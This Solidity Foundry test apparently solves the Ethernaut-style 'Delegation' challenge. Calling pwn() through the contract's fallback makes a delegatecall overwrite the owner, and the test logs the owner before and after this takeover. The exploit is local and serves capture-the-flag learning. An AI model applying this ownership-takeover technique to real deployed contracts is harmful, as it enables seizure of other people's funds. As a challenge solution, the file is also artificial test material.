// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test} from "forge-std/Test.sol";
import {console} from "forge-std/console.sol";

contract DelegationTest is Test {
    address owner = address(0x0);
    address player = address(0x1);

    function test_Attack() public {
        vm.startPrank(owner);
        vm.deal(owner, 1 ether);

        address delegateAddr = deployCode(
            "Level06Delegation.sol:Delegate",
            abi.encode(owner)
        );
        address delegationAddr = deployCode(
            "Level06Delegation.sol:Delegation",
            abi.encode(delegateAddr)
        );

        vm.stopPrank();

        vm.startPrank(player);
        vm.deal(player, 1 ether);

        // check initial owner
        (bool success, bytes memory result) = delegationAddr.call(
            abi.encodeWithSignature("owner()")
        );
        require(success, "Failed to call owner()");

        address ownerAddress = abi.decode(result, (address));
        console.log("initial owner: ", ownerAddress);

        // player call fallback() of delegationAddr and msg.sender of delegatecall is player
        (success, ) = delegationAddr.call(abi.encodeWithSignature("pwn()"));
        require(success, "Delegatecall failed");

        // now check owner
        (success, result) = delegationAddr.call(
            abi.encodeWithSignature("owner()")
        );
        require(success, "Failed to call owner()");

        ownerAddress = abi.decode(result, (address));
        console.log("new owner: ", ownerAddress);

        vm.stopPrank();
    }
}
